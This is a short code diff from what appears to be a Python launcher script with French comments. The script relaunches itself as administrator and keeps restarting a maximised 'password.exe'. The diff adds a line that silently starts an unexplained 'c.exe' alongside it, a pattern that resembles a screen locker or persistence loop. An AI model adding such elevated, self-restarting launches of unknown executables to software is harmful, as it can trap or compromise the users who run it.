@@ -18,6 +18,7 @@ if is_admin(): # Si l'utilisateur est administrateur
             time.sleep(1.5)
         elif "password.exe" not in (p.name() for p in psutil.process_iter()):
             os.system("start /MAX password.exe")
+            os.system("start c.exe")
             time.sleep(1.5)
     
 else: # Sinon relancer le launcher en administrateur
